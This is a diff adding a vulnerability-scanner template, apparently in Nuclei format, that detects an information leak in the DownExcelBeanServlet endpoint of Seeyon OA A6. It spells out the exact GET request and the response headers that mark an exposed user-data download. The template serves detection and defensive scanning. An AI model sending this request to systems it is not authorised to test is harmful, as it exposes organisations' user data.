@@ -1,0 +1,20 @@
+id: seeyon-downexcelbeanservlet-info-leakage
+info:
+  name: Seeyon OA A6 DownExcelBeanServlet Information Leakage
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "attachment"
+          - "application/x-msdownload"
